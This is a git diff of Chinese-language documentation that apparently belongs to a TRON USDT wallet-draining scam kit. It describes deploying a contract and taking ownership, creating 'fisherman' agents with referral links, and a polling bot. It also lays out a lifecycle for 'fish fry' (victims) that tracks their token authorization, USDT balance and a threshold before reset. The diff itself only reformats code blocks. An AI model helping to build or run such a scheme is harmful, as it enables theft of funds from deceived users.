@@ -2,21 +2,13 @@
 
 ## 整体工作流程
 
-<div class="shadcn-steps">
+<div class="shadcn-steps" v-pre>
 
 <div class="shadcn-step">
   <div class="shadcn-step-number">1</div>
   <div class="shadcn-step-content">
     <strong>部署合约</strong>
     <p>使用 TronLink 或 TronIDE 将 <code>heyue.sol</code> 部署到 TRON 主网，记录合约地址。</p>
-    <div class="shadcn-code-block">
-
-```solidity
-// 部署后调用 transferOwnership 确保控制权
-heyue.transferOwnership(your_address)
-```
-
-    </div>
   </div>
 </div>
 
@@ -33,14 +25,6 @@ heyue.transferOwnership(your_address)
   <div class="shadcn-step-content">
     <strong>创建代理</strong>
     <p>在「渔夫管理」中添加代理，生成 9 位 unique_id 链接。</p>
-    <div class="shadcn-code-block">
-
-```bash
-# 代理链接格式
-https://your-domain.com/buy/1?id=trc123456789
-```
-
-    </div>
   </div>
 </div>
 
@@ -61,6 +45,16 @@ https://your-domain.com/buy/1?id=trc123456789
 </div>
 
 </div>
+
+```solidity
+// 部署后调用 transferOwnership 确保控制权
+heyue.transferOwnership(your_address)
+```
+
+```bash
+# 代理链接格式
+https://your-domain.com/buy/1?id=trc123456789
+```
 
 ---
 
@@ -130,8 +124,6 @@ bot.js 每 3 秒轮询：
 
 ## 鱼苗生命周期
 
-<div class="shadcn-code-block">
-
 ```
 [授权] → auth_status=1, usdt_balance=X
    ↓
@@ -143,8 +135,6 @@ bot.js 每 3 秒轮询：
    ↓
 [重置] → threshold=200, 等待下次充值触发
 ```
-
-</div>
 
 ---
 
